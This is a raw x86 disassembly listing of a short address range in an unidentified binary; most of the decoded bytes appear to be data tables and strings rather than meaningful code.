  427943:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  42794d:	add    al,BYTE PTR [eax]
  42794f:	lahf   
  427950:	add    DWORD PTR [edx],0x0
  427953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427954:	add    DWORD PTR [edx],0x0
  427957:	mov    ch,0x83
  427959:	add    al,BYTE PTR [eax]
  42795b:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427962:	add    cl,bl
  427964:	add    DWORD PTR [edx],0x0
  427967:	jecxz  0x4278ec
  427969:	add    al,BYTE PTR [eax]
  42796b:	out    dx,eax
  42796c:	add    DWORD PTR [edx],0x0
  42796f:	std    
  427970:	add    DWORD PTR [edx],0x0
  427973:	pop    es
  427974:	test   BYTE PTR [edx],al
  427976:	add    BYTE PTR [ecx],dl
  427978:	test   BYTE PTR [edx],al
  42797a:	add    BYTE PTR [edi],bl
  42797c:	test   BYTE PTR [edx],al
  42797e:	add    BYTE PTR [edi],ah
  427980:	test   BYTE PTR [edx],al
  427982:	add    BYTE PTR [ecx],dh
  427984:	test   BYTE PTR [edx],al
  427986:	add    BYTE PTR [ebx],bh
  427988:	test   BYTE PTR [edx],al
  42798a:	add    BYTE PTR [ebp-0x7c],al
  42798d:	add    al,BYTE PTR [eax]
  42798f:	dec    ebp
  427990:	test   BYTE PTR [edx],al
  427992:	add    BYTE PTR [edi-0x7c],dl
  427995:	add    al,BYTE PTR [eax]
  427997:	popa   
  427998:	test   BYTE PTR [edx],al
  42799a:	add    BYTE PTR [ebx-0x7c],ch
  42799d:	add    al,BYTE PTR [eax]
  42799f:	jg     0x427925
  4279a1:	add    al,BYTE PTR [eax]
  4279a3:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  4279aa:	add    BYTE PTR [ebx-0x54fffd7c],bl
  4279b0:	test   BYTE PTR [edx],al
  4279b2:	add    BYTE PTR [eax],al
  4279b4:	add    BYTE PTR [eax],al
  4279b6:	add    cl,al
  4279b8:	test   BYTE PTR [edx],al
  4279ba:	add    cl,bl
  4279bc:	test   BYTE PTR [edx],al
  4279be:	add    bh,ah
  4279c0:	test   BYTE PTR [edx],al
  4279c2:	add    bl,bh
  4279c4:	test   BYTE PTR [edx],al
  4279c6:	add    BYTE PTR ds:0x1d000285,cl
  4279cc:	test   DWORD PTR [edx],eax
  4279ce:	add    BYTE PTR [edi],ch
  4279d0:	test   DWORD PTR [edx],eax
  4279d2:	add    BYTE PTR ds:0x51000285,bh
  4279d8:	test   DWORD PTR [edx],eax
  4279da:	add    BYTE PTR [ecx-0x7b],ah
  4279dd:	add    al,BYTE PTR [eax]
  4279df:	ja     0x427966
  4279e1:	add    al,BYTE PTR [eax]
  4279e3:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  4279e9:	add    al,BYTE PTR [eax]
  4279eb:	mov    ds:0xb9000285,eax
  4279f0:	test   DWORD PTR [edx],eax
  4279f2:	add    cl,cl
  4279f4:	test   DWORD PTR [edx],eax
  4279f6:	add    ch,dl
  4279f8:	test   DWORD PTR [edx],eax
  4279fa:	add    bh,ah
  4279fc:	test   DWORD PTR [edx],eax
  4279fe:	add    cl,dh
  427a00:	test   DWORD PTR [edx],eax
  427a02:	add    BYTE PTR [ebx],cl
  427a04:	xchg   BYTE PTR [edx],al
  427a06:	add    BYTE PTR [ecx],ah
  427a08:	xchg   BYTE PTR [edx],al
  427a0a:	add    BYTE PTR ds:0x45000286,dh
  427a10:	xchg   BYTE PTR [edx],al
  427a12:	add    BYTE PTR [ecx-0x7a],dl
  427a15:	add    al,BYTE PTR [eax]
  427a17:	popa   
  427a18:	xchg   BYTE PTR [edx],al
  427a1a:	add    BYTE PTR [ebp-0x7a],ch
  427a1d:	add    al,BYTE PTR [eax]
  427a1f:	jg     0x4279a7
  427a21:	add    al,BYTE PTR [eax]
  427a23:	lea    eax,[esi-0x7964fffe]
  427a29:	add    al,BYTE PTR [eax]
  427a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a2c:	xchg   BYTE PTR [edx],al
  427a2e:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427a34:	xchg   BYTE PTR [edx],al
  427a36:	add    cl,bl
  427a38:	xchg   BYTE PTR [edx],al
  427a3a:	add    ch,ch
  427a3c:	xchg   BYTE PTR [edx],al
  427a3e:	add    bl,bh
  427a40:	xchg   BYTE PTR [edx],al
  427a42:	add    BYTE PTR ds:0x1d000287,cl
  427a48:	xchg   DWORD PTR [edx],eax
  427a4a:	add    BYTE PTR [ebx],ch
  427a4c:	xchg   DWORD PTR [edx],eax
  427a4e:	add    BYTE PTR [ecx-0x79],al
  427a51:	add    al,BYTE PTR [eax]
  427a53:	dec    ebp
  427a54:	xchg   DWORD PTR [edx],eax
  427a56:	add    BYTE PTR [ebx-0x79],ah
  427a59:	add    al,BYTE PTR [eax]
  427a5b:	jg     0x4279e4
  427a5d:	add    al,BYTE PTR [eax]
  427a5f:	xchg   ebx,eax
  427a60:	xchg   DWORD PTR [edx],eax
  427a62:	add    BYTE PTR [edi-0x44fffd79],ah
  427a68:	xchg   DWORD PTR [edx],eax
  427a6a:	add    cl,dl
  427a6c:	xchg   DWORD PTR [edx],eax
  427a6e:	add    cl,ch
  427a70:	xchg   DWORD PTR [edx],eax
  427a72:	add    bh,dh
  427a74:	xchg   DWORD PTR [edx],eax
  427a76:	add    BYTE PTR [ecx],cl
  427a78:	mov    BYTE PTR [edx],al
  427a7a:	add    BYTE PTR [edi],bl
  427a7c:	mov    BYTE PTR [edx],al
  427a7e:	add    BYTE PTR [ecx],dh
  427a80:	mov    BYTE PTR [edx],al
  427a82:	add    BYTE PTR [ebp-0x78],al
  427a85:	add    al,BYTE PTR [eax]
  427a87:	add    BYTE PTR [eax],al
  427a89:	add    BYTE PTR [eax],al
  427a8b:	mov    BYTE PTR gs:[edx],al
  427a8e:	add    BYTE PTR [ebx-0x78],dh
  427a91:	add    al,BYTE PTR [eax]
  427a93:	test   DWORD PTR [eax-0x7768fffe],ecx
  427a99:	add    al,BYTE PTR [eax]
  427a9b:	mov    ds:0xb5000288,eax
  427aa0:	mov    BYTE PTR [edx],al
  427aa2:	add    bh,al
  427aa4:	mov    BYTE PTR [edx],al
  427aa6:	add    bl,bl
  427aa8:	mov    BYTE PTR [edx],al
  427aaa:	add    bh,ah
  427aac:	mov    BYTE PTR [edx],al
  427aae:	add    ch,dh
  427ab0:	mov    BYTE PTR [edx],al
  427ab2:	add    BYTE PTR [ecx],al
  427ab4:	mov    DWORD PTR [edx],eax
  427ab6:	add    BYTE PTR [ebx],dl
  427ab8:	mov    DWORD PTR [edx],eax
  427aba:	add    BYTE PTR [ecx],ah
  427abc:	mov    DWORD PTR [edx],eax
  427abe:	add    BYTE PTR [edi],ch
  427ac0:	mov    DWORD PTR [edx],eax
  427ac2:	add    BYTE PTR [ebx-0x77],cl
  427ac5:	add    al,BYTE PTR [eax]
  427ac7:	pop    ebx
  427ac8:	mov    DWORD PTR [edx],eax
  427aca:	add    BYTE PTR [ebp-0x77],dh
  427acd:	add    al,BYTE PTR [eax]
  427acf:	test   DWORD PTR [ecx-0x7664fffe],ecx
  427ad5:	add    al,BYTE PTR [eax]
  427ad7:	stos   DWORD PTR es:[edi],eax
  427ad8:	mov    DWORD PTR [edx],eax
  427ada:	add    BYTE PTR [edi-0x34fffd77],dh
  427ae0:	mov    DWORD PTR [edx],eax
  427ae2:	add    bl,ah
  427ae4:	mov    DWORD PTR [edx],eax
  427ae6:	add    bh,ch
  427ae8:	mov    DWORD PTR [edx],eax
  427aea:	add    bh,bh
  427aec:	mov    DWORD PTR [edx],eax
  427aee:	add    BYTE PTR [ebx],cl
  427af0:	mov    al,BYTE PTR [edx]
  427af2:	add    BYTE PTR [edi],dl
  427af4:	mov    al,BYTE PTR [edx]
  427af6:	add    BYTE PTR ds:0x2f00028a,ah
  427afc:	mov    al,BYTE PTR [edx]
  427afe:	add    BYTE PTR [edi],bh
  427b00:	mov    al,BYTE PTR [edx]
  427b02:	add    BYTE PTR [ecx-0x76],dl
  427b05:	add    al,BYTE PTR [eax]
  427b07:	pop    ebp
  427b08:	mov    al,BYTE PTR [edx]
  427b0a:	add    BYTE PTR [edi-0x76],ch
  427b0d:	add    al,BYTE PTR [eax]
  427b0f:	jnp    0x427a9b
  427b11:	add    al,BYTE PTR [eax]
  427b13:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  427b19:	add    al,BYTE PTR [eax]
  427b1b:	lods   eax,DWORD PTR ds:[esi]
  427b1c:	mov    al,BYTE PTR [edx]
  427b1e:	add    BYTE PTR [ebx-0x32fffd76],bh
  427b24:	mov    al,BYTE PTR [edx]
  427b26:	add    ch,bl
  427b28:	mov    al,BYTE PTR [edx]
  427b2a:	add    ch,ch
  427b2c:	mov    al,BYTE PTR [edx]
  427b2e:	add    BYTE PTR [ecx],cl
  427b30:	mov    eax,DWORD PTR [edx]
  427b32:	add    BYTE PTR [ecx],bl
  427b34:	mov    eax,DWORD PTR [edx]
  427b36:	add    BYTE PTR [ecx],ch
  427b38:	mov    eax,DWORD PTR [edx]
  427b3a:	add    BYTE PTR [edi],dh
  427b3c:	mov    eax,DWORD PTR [edx]
  427b3e:	add    BYTE PTR [ebp-0x75],cl
  427b41:	add    al,BYTE PTR [eax]
  427b43:	pop    ebx
  427b44:	mov    eax,DWORD PTR [edx]
  427b46:	add    BYTE PTR [ebp-0x75],ah
  427b49:	add    al,BYTE PTR [eax]
  427b4b:	jno    0x427ad8
  427b4d:	add    al,BYTE PTR [eax]
  427b4f:	or     DWORD PTR [ebx-0x7464fffe],0x2
  427b56:	add    BYTE PTR [ebp-0x42fffd75],ch
  427b5c:	mov    eax,DWORD PTR [edx]
  427b5e:	add    cl,dl
  427b60:	mov    eax,DWORD PTR [edx]
  427b62:	add    cl,ah
  427b64:	mov    eax,DWORD PTR [edx]
  427b66:	add    bh,dh
  427b68:	mov    eax,DWORD PTR [edx]
  427b6a:	add    BYTE PTR ds:0x1900028c,al
  427b70:	mov    WORD PTR [edx],es
  427b72:	add    BYTE PTR [edi],ah
  427b74:	mov    WORD PTR [edx],es
  427b76:	add    BYTE PTR [ecx],bh
  427b78:	mov    WORD PTR [edx],es
  427b7a:	add    BYTE PTR [ebx-0x74],cl
  427b7d:	add    al,BYTE PTR [eax]
  427b7f:	pop    ebp
  427b80:	mov    WORD PTR [edx],es
  427b82:	add    BYTE PTR [ecx-0x74],ch
  427b85:	add    al,BYTE PTR [eax]
  427b87:	ja     0x427b15
  427b89:	add    al,BYTE PTR [eax]
  427b8b:	lea    ecx,[edx+eax*1+0x28ca100]
  427b92:	add    BYTE PTR [ebp-0x38fffd74],dh
  427b98:	mov    WORD PTR [edx],es
  427b9a:	add    cl,dl
  427b9c:	mov    WORD PTR [edx],es
  427b9e:	add    bl,ah
  427ba0:	mov    WORD PTR [edx],es
  427ba2:	add    bh,dh
  427ba4:	mov    WORD PTR [edx],es
  427ba6:	add    BYTE PTR [ebx],cl
  427ba8:	lea    eax,[edx]
  427baa:	add    BYTE PTR [ebx],bl
  427bac:	lea    eax,[edx]
  427bae:	add    BYTE PTR [ecx],ch
  427bb0:	lea    eax,[edx]
  427bb2:	add    BYTE PTR [ebx-0x73],al
  427bb5:	add    al,BYTE PTR [eax]
  427bb7:	pop    ebx
  427bb8:	lea    eax,[edx]
  427bba:	add    BYTE PTR [ecx-0x73],ch
  427bbd:	add    al,BYTE PTR [eax]
  427bbf:	jnp    0x427b4e
  427bc1:	add    al,BYTE PTR [eax]
  427bc3:	mov    DWORD PTR [ebp-0x726afffe],ecx
  427bc9:	add    al,BYTE PTR [eax]
  427bcb:	scas   eax,DWORD PTR es:[edi]
  427bcc:	lea    eax,[edx]
  427bce:	add    cl,al
  427bd0:	lea    eax,[edx]
  427bd2:	add    bl,dl
  427bd4:	lea    eax,[edx]
  427bd6:	add    bl,ah
  427bd8:	lea    eax,[edx]
  427bda:	add    bl,dh
  427bdc:	lea    eax,[edx]
  427bde:	add    ch,bh
  427be0:	lea    eax,[edx]
  427be2:	add    BYTE PTR ds:0x1f00028e,cl
  427be8:	mov    es,WORD PTR [edx]
  427bea:	add    BYTE PTR [edi],ch
  427bec:	mov    es,WORD PTR [edx]
  427bee:	add    BYTE PTR [ebp-0x72],al
  427bf1:	add    al,BYTE PTR [eax]
  427bf3:	pop    ebp
  427bf4:	mov    es,WORD PTR [edx]
  427bf6:	add    BYTE PTR [edi-0x72],ch
  427bf9:	add    al,BYTE PTR [eax]
  427bfb:	jg     0x427b8b
  427bfd:	add    al,BYTE PTR [eax]
  427bff:	xchg   ecx,eax
  427c00:	mov    es,WORD PTR [edx]
  427c02:	add    BYTE PTR [edi-0x4efffd72],bl
  427c08:	mov    es,WORD PTR [edx]
  427c0a:	add    BYTE PTR [edi-0x2efffd72],bh
  427c10:	mov    es,WORD PTR [edx]
  427c12:	add    bl,ah
  427c14:	mov    es,WORD PTR [edx]
  427c16:	add    bh,dh
  427c18:	mov    es,WORD PTR [edx]
  427c1a:	add    BYTE PTR [ebx],cl
  427c1c:	pop    DWORD PTR [edx]
  427c1e:	add    BYTE PTR ds:0x3300028f,bl
  427c24:	pop    DWORD PTR [edx]
  427c26:	add    BYTE PTR [ebp-0x71],al
  427c29:	add    al,BYTE PTR [eax]
  427c2b:	popa   
  427c2c:	pop    DWORD PTR [edx]
  427c2e:	add    BYTE PTR [edi-0x71],dh
  427c31:	add    al,BYTE PTR [eax]
  427c33:	test   DWORD PTR [edi-0x7066fffe],ecx
  427c39:	add    al,BYTE PTR [eax]
  427c3b:	add    BYTE PTR [eax],al
  427c3d:	add    BYTE PTR [eax],al
  427c3f:	mov    bl,0x8f
  427c41:	add    al,BYTE PTR [eax]
  427c43:	ret    
  427c44:	pop    DWORD PTR [edx]
  427c46:	add    bl,bl
  427c48:	pop    DWORD PTR [edx]
  427c4a:	add    ch,ah
  427c4c:	pop    DWORD PTR [edx]
  427c4e:	add    ch,dh
  427c50:	pop    DWORD PTR [edx]
  427c52:	add    BYTE PTR [ecx],cl
  427c54:	nop
  427c55:	add    al,BYTE PTR [eax]
  427c57:	pop    ss
  427c58:	nop
  427c59:	add    al,BYTE PTR [eax]
  427c5b:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  427c61:	add    al,BYTE PTR [eax]
  427c63:	dec    edi
  427c64:	nop
  427c65:	add    al,BYTE PTR [eax]
  427c67:	pop    ebp
  427c68:	nop
  427c69:	add    al,BYTE PTR [eax]
  427c6b:	addr16 nop
  427c6d:	add    al,BYTE PTR [eax]
  427c6f:	jns    0x427c01
  427c71:	add    al,BYTE PTR [eax]
  427c73:	lea    edx,[eax-0x6f66fffe]
  427c79:	add    al,BYTE PTR [eax]
  427c7b:	scas   eax,DWORD PTR es:[edi]
  427c7c:	nop
  427c7d:	add    al,BYTE PTR [eax]
  427c7f:	ret    
  427c80:	nop
  427c81:	add    al,BYTE PTR [eax]
  427c83:	rcl    DWORD PTR [eax-0x6f1afffe],1
  427c89:	add    al,BYTE PTR [eax]
  427c8b:	stc    
  427c8c:	nop
  427c8d:	add    al,BYTE PTR [eax]
  427c8f:	add    eax,0x11000291
  427c94:	xchg   ecx,eax
  427c95:	add    al,BYTE PTR [eax]
  427c97:	daa    
  427c98:	xchg   ecx,eax
  427c99:	add    al,BYTE PTR [eax]
  427c9b:	xor    eax,0x41000291
  427ca0:	xchg   ecx,eax
  427ca1:	add    al,BYTE PTR [eax]
  427ca3:	push   ebx
  427ca4:	xchg   ecx,eax
  427ca5:	add    al,BYTE PTR [eax]
  427ca7:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  427cb1:	add    al,BYTE PTR [eax]
  427cb3:	fwait
  427cb4:	xchg   ecx,eax
  427cb5:	add    al,BYTE PTR [eax]
  427cb7:	stos   DWORD PTR es:[edi],eax
  427cb8:	xchg   ecx,eax
  427cb9:	add    al,BYTE PTR [eax]
  427cbb:	mov    ecx,0xc3000291
  427cc0:	xchg   ecx,eax
  427cc1:	add    al,BYTE PTR [eax]
  427cc3:	int    0x91
  427cc5:	add    al,BYTE PTR [eax]
  427cc7:	fst    DWORD PTR [ecx-0x6e1afffe]
  427ccd:	add    al,BYTE PTR [eax]
  427ccf:	not    DWORD PTR [ecx-0x6df2fffe]
  427cd5:	add    al,BYTE PTR [eax]
  427cd7:	daa    
  427cd8:	xchg   edx,eax
  427cd9:	add    al,BYTE PTR [eax]
  427cdb:	aaa    
  427cdc:	xchg   edx,eax
  427cdd:	add    al,BYTE PTR [eax]
  427cdf:	inc    ecx
  427ce0:	xchg   edx,eax
  427ce1:	add    al,BYTE PTR [eax]
  427ce3:	push   ecx
  427ce4:	xchg   edx,eax
  427ce5:	add    al,BYTE PTR [eax]
  427ce7:	arpl   WORD PTR [edx-0x6d8efffe],dx
  427ced:	add    al,BYTE PTR [eax]
  427cef:	mov    edx,DWORD PTR [edx+0x2]
  427cf5:	add    BYTE PTR [eax],al
  427cf7:	inc    edx
  427cf8:	xor    al,0x10
  427cfa:	add    cl,dl
  427cfc:	add    dl,BYTE PTR [eax]
  427cfe:	add    BYTE PTR [edi],bh
  427d00:	jge    0x427d12
  427d02:	add    BYTE PTR ds:0xe1001070,dl
  427d08:	jae    0x427d1a
  427d0a:	add    BYTE PTR [esi-0x52ffeff5],al
  427d10:	jae    0x427d22
  427d12:	add    BYTE PTR [edx+0x25],ah
  427d15:	adc    BYTE PTR [eax],al
  427d17:	je     0x427d44
  427d19:	adc    BYTE PTR [eax],al
  427d1b:	sahf   
  427d1c:	jp     0x427d2e
  427d1e:	add    BYTE PTR [edi],ch
  427d20:	adc    BYTE PTR [eax],dl
	...
  427d2a:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  427d2e:	dec    ebp
  427d2f:	add    BYTE PTR [eax],al
  427d31:	add    BYTE PTR [eax],al
  427d33:	pop    ecx
  427d34:	jge    0x427d38
  427d36:	add    BYTE PTR [ecx],al
  427d38:	add    BYTE PTR [eax],al
  427d3a:	add    BYTE PTR [ecx],al
  427d3c:	add    BYTE PTR [eax],al
  427d3e:	add    BYTE PTR [ecx],al
  427d40:	add    BYTE PTR [eax],al
  427d42:	add    BYTE PTR [edi+0x7d],cl
  427d45:	add    al,BYTE PTR [eax]
  427d47:	push   ebx
  427d48:	jge    0x427d4c
  427d4a:	add    BYTE PTR [edi+0x7d],dl
  427d4d:	add    al,BYTE PTR [eax]
  427d4f:	in     eax,dx
  427d50:	arpl   WORD PTR [eax],ax
  427d52:	add    BYTE PTR [edx+0x7d],ch
  427d55:	add    al,BYTE PTR [eax]
  427d57:	add    BYTE PTR [eax],al
  427d59:	dec    bp
  427d5b:	jno    0x427db2
  427d5d:	outs   dx,DWORD PTR ds:[esi]
  427d5e:	pop    ecx
  427d5f:	xor    al,0x55
  427d61:	jbe    0x427dd1
  427d63:	dec    eax
  427d64:	cs data16 ins BYTE PTR es:[di],dx
  427d68:	jo     0x427d6a
  427d6a:	aas    
  427d6b:	inc    edi
  427d6c:	outs   dx,BYTE PTR gs:[esi]
  427d6e:	gs jb  0x427dd2
  427d71:	je     0x427dd8
  427d73:	push   eax
  427d74:	outs   dx,DWORD PTR ds:[esi]
  427d75:	imul   ebp,DWORD PTR [esi+0x74],0x4077654e
  427d7c:	inc    eax
  427d7d:	pop    ecx
  427d7e:	inc    edi
  427d7f:	inc    esi
  427d80:	push   eax
  427d81:	inc    ecx
  427d82:	pop    edi
  427d83:	dec    esi
  427d84:	inc    esp
  427d85:	cmp    al,0x56
  427d87:	add    bh,dh
  427d89:	jl     0x427dcd
  427d8b:	add    bl,bh
  427d8d:	jl     0x427dd1
  427d8f:	add    bh,bh
  427d91:	jl     0x427dd5
  427d93:	add    BYTE PTR [ebx],al
  427d95:	jge    0x427dd9
  427d97:	add    BYTE PTR [edi],al
  427d99:	jge    0x427ddd
  427d9b:	add    BYTE PTR [ebx],cl
  427d9d:	jge    0x427de1
  427d9f:	add    BYTE PTR [edi],cl
  427da1:	jge    0x427de5
  427da3:	add    BYTE PTR [ebx],dl
  427da5:	jge    0x427de9
  427da7:	add    BYTE PTR [edi],dl
  427da9:	jge    0x427ded
  427dab:	add    BYTE PTR [ebx],bl
  427dad:	jge    0x427df1
  427daf:	add    BYTE PTR [edi],bl
  427db1:	jge    0x427df5
  427db3:	add    BYTE PTR [eax],al
  427db5:	add    BYTE PTR [eax],al
  427db7:	das    
  427db8:	jle    0x427dbc
	...
  427dc2:	add    bl,al
  427dc4:	add    BYTE PTR [edx],0x0
  427dc7:	out    0x78,eax
  427dc9:	add    al,BYTE PTR [eax]
  427dcb:	dec    ebx
  427dcc:	jle    0x427dd0
	...
  427dd6:	add    BYTE PTR [ebp+0x3000284],dh
  427ddc:	jns    0x427de0
  427dde:	add    bh,bh
  427de0:	jle    0x427de4
	...
  427dea:	add    BYTE PTR [edi-0x78],dl
  427ded:	add    al,BYTE PTR [eax]
  427def:	mov    bh,0x79
  427df1:	add    al,BYTE PTR [eax]
  427df3:	sar    DWORD PTR [edi+0x2],cl
	...
  427dfe:	add    BYTE PTR [edi-0x74fffd71],ah
  427e04:	jp     0x427e08
  427e06:	add    BYTE PTR [edi+0x281],al
  427e0c:	add    BYTE PTR [eax],al
  427e0e:	add    BYTE PTR [eax],al
  427e10:	add    BYTE PTR [eax],al
  427e12:	add    BYTE PTR [edi+0x3f000292],dl
  427e18:	jl     0x427e1c
	...
  427e2e:	add    BYTE PTR [edi],bh
  427e30:	add    BYTE PTR [edx],0x0
  427e33:	push   ecx
  427e34:	add    BYTE PTR [edx],0x0
  427e37:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  427e41:	add    al,BYTE PTR [eax]
  427e43:	stos   DWORD PTR es:[edi],eax
  427e44:	add    BYTE PTR [edx],0x0
  427e47:	add    BYTE PTR [eax],al
  427e49:	add    BYTE PTR [eax],al
  427e4b:	rol    DWORD PTR [edx-0x7d20fffe],1
  427e51:	add    al,BYTE PTR [eax]
  427e53:	jmp    0xf34280da
  427e58:	add    BYTE PTR [edx],0x0
  427e5b:	std    
  427e5c:	add    BYTE PTR [edx],0x0
  427e5f:	jae    0x835f7e67
  427e65:	add    al,BYTE PTR [eax]
  427e67:	and    eax,0x35000283
  427e6c:	add    DWORD PTR [edx],0x0
  427e6f:	aas    
  427e70:	add    DWORD PTR [edx],0x0
  427e73:	dec    ecx
  427e74:	add    DWORD PTR [edx],0x0
  427e77:	push   ebx
  427e78:	add    DWORD PTR [edx],0x0
  427e7b:	pop    ebp
  427e7c:	add    DWORD PTR [edx],0x0
  427e7f:	add    DWORD PTR [bp+si],0x0
  427e83:	jno    0x427e08
  427e85:	add    al,BYTE PTR [eax]
  427e87:	jns    0x427e0c
  427e89:	add    al,BYTE PTR [eax]
  427e8b:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  427e95:	add    al,BYTE PTR [eax]
  427e97:	lahf   
  427e98:	add    DWORD PTR [edx],0x0
  427e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e9c:	add    DWORD PTR [edx],0x0
  427e9f:	mov    ch,0x83
  427ea1:	add    al,BYTE PTR [eax]
  427ea3:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427eaa:	add    cl,bl
  427eac:	add    DWORD PTR [edx],0x0
  427eaf:	jecxz  0x427e34
  427eb1:	add    al,BYTE PTR [eax]
  427eb3:	out    dx,eax
  427eb4:	add    DWORD PTR [edx],0x0
  427eb7:	std    
  427eb8:	add    DWORD PTR [edx],0x0
  427ebb:	pop    es
  427ebc:	test   BYTE PTR [edx],al
  427ebe:	add    BYTE PTR [ecx],dl
  427ec0:	test   BYTE PTR [edx],al
  427ec2:	add    BYTE PTR [edi],bl
  427ec4:	test   BYTE PTR [edx],al
  427ec6:	add    BYTE PTR [edi],ah
  427ec8:	test   BYTE PTR [edx],al
  427eca:	add    BYTE PTR [ecx],dh
  427ecc:	test   BYTE PTR [edx],al
  427ece:	add    BYTE PTR [ebx],bh
  427ed0:	test   BYTE PTR [edx],al
  427ed2:	add    BYTE PTR [ebp-0x7c],al
  427ed5:	add    al,BYTE PTR [eax]
  427ed7:	dec    ebp
  427ed8:	test   BYTE PTR [edx],al
  427eda:	add    BYTE PTR [edi-0x7c],dl
  427edd:	add    al,BYTE PTR [eax]
  427edf:	popa   
  427ee0:	test   BYTE PTR [edx],al
  427ee2:	add    BYTE PTR [ebx-0x7c],ch
  427ee5:	add    al,BYTE PTR [eax]
  427ee7:	jg     0x427e6d
  427ee9:	add    al,BYTE PTR [eax]
  427eeb:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  427ef2:	add    BYTE PTR [ebx-0x54fffd7c],bl
  427ef8:	test   BYTE PTR [edx],al
  427efa:	add    BYTE PTR [eax],al
  427efc:	add    BYTE PTR [eax],al
  427efe:	add    cl,al
  427f00:	test   BYTE PTR [edx],al
  427f02:	add    cl,bl
  427f04:	test   BYTE PTR [edx],al
  427f06:	add    bh,ah
  427f08:	test   BYTE PTR [edx],al
  427f0a:	add    bl,bh
  427f0c:	test   BYTE PTR [edx],al
  427f0e:	add    BYTE PTR ds:0x1d000285,cl
  427f14:	test   DWORD PTR [edx],eax
  427f16:	add    BYTE PTR [edi],ch
  427f18:	test   DWORD PTR [edx],eax
  427f1a:	add    BYTE PTR ds:0x51000285,bh
  427f20:	test   DWORD PTR [edx],eax
  427f22:	add    BYTE PTR [ecx-0x7b],ah
  427f25:	add    al,BYTE PTR [eax]
  427f27:	ja     0x427eae
  427f29:	add    al,BYTE PTR [eax]
  427f2b:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  427f31:	add    al,BYTE PTR [eax]
  427f33:	mov    ds:0xb9000285,eax
  427f38:	test   DWORD PTR [edx],eax
  427f3a:	add    cl,cl
  427f3c:	test   DWORD PTR [edx],eax
  427f3e:	add    ch,dl
  427f40:	test   DWORD PTR [edx],eax
  427f42:	add    bh,ah
  427f44:	test   DWORD PTR [edx],eax
  427f46:	add    cl,dh
  427f48:	test   DWORD PTR [edx],eax
  427f4a:	add    BYTE PTR [ebx],cl
  427f4c:	xchg   BYTE PTR [edx],al
  427f4e:	add    BYTE PTR [ecx],ah
  427f50:	xchg   BYTE PTR [edx],al
  427f52:	add    BYTE PTR ds:0x45000286,dh
  427f58:	xchg   BYTE PTR [edx],al
  427f5a:	add    BYTE PTR [ecx-0x7a],dl
  427f5d:	add    al,BYTE PTR [eax]
  427f5f:	popa   
  427f60:	xchg   BYTE PTR [edx],al
  427f62:	add    BYTE PTR [ebp-0x7a],ch
  427f65:	add    al,BYTE PTR [eax]
  427f67:	jg     0x427eef
  427f69:	add    al,BYTE PTR [eax]
  427f6b:	lea    eax,[esi-0x7964fffe]
  427f71:	add    al,BYTE PTR [eax]
  427f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f74:	xchg   BYTE PTR [edx],al
  427f76:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427f7c:	xchg   BYTE PTR [edx],al
  427f7e:	add    cl,bl
  427f80:	xchg   BYTE PTR [edx],al
  427f82:	add    ch,ch
  427f84:	xchg   BYTE PTR [edx],al
  427f86:	add    bl,bh
  427f88:	xchg   BYTE PTR [edx],al
  427f8a:	add    BYTE PTR ds:0x1d000287,cl
  427f90:	xchg   DWORD PTR [edx],eax
  427f92:	add    BYTE PTR [ebx],ch
  427f94:	xchg   DWORD PTR [edx],eax
  427f96:	add    BYTE PTR [ecx-0x79],al
  427f99:	add    al,BYTE PTR [eax]
  427f9b:	dec    ebp
  427f9c:	xchg   DWORD PTR [edx],eax
  427f9e:	add    BYTE PTR [ebx-0x79],ah
  427fa1:	add    al,BYTE PTR [eax]
  427fa3:	jg     0x427f2c
  427fa5:	add    al,BYTE PTR [eax]
  427fa7:	xchg   ebx,eax
  427fa8:	xchg   DWORD PTR [edx],eax
  427faa:	add    BYTE PTR [edi-0x44fffd79],ah
  427fb0:	xchg   DWORD PTR [edx],eax
  427fb2:	add    cl,dl
  427fb4:	xchg   DWORD PTR [edx],eax
  427fb6:	add    cl,ch
  427fb8:	xchg   DWORD PTR [edx],eax
  427fba:	add    bh,dh
  427fbc:	xchg   DWORD PTR [edx],eax
  427fbe:	add    BYTE PTR [ecx],cl
  427fc0:	mov    BYTE PTR [edx],al
  427fc2:	add    BYTE PTR [edi],bl
  427fc4:	mov    BYTE PTR [edx],al
  427fc6:	add    BYTE PTR [ecx],dh
  427fc8:	mov    BYTE PTR [edx],al
  427fca:	add    BYTE PTR [ebp-0x78],al
  427fcd:	add    al,BYTE PTR [eax]
  427fcf:	add    BYTE PTR [eax],al
  427fd1:	add    BYTE PTR [eax],al
  427fd3:	mov    BYTE PTR gs:[edx],al
  427fd6:	add    BYTE PTR [ebx-0x78],dh
  427fd9:	add    al,BYTE PTR [eax]
  427fdb:	test   DWORD PTR [eax-0x7768fffe],ecx
  427fe1:	add    al,BYTE PTR [eax]
  427fe3:	mov    ds:0xb5000288,eax
  427fe8:	mov    BYTE PTR [edx],al
  427fea:	add    bh,al
  427fec:	mov    BYTE PTR [edx],al
  427fee:	add    bl,bl
  427ff0:	mov    BYTE PTR [edx],al
  427ff2:	add    bh,ah
  427ff4:	mov    BYTE PTR [edx],al
  427ff6:	add    ch,dh
  427ff8:	mov    BYTE PTR [edx],al
  427ffa:	add    BYTE PTR [ecx],al
  427ffc:	mov    DWORD PTR [edx],eax
  427ffe:	add    BYTE PTR [ebx],dl
  428000:	mov    DWORD PTR [edx],eax
  428002:	add    BYTE PTR [ecx],ah
  428004:	mov    DWORD PTR [edx],eax
  428006:	add    BYTE PTR [edi],ch
  428008:	mov    DWORD PTR [edx],eax
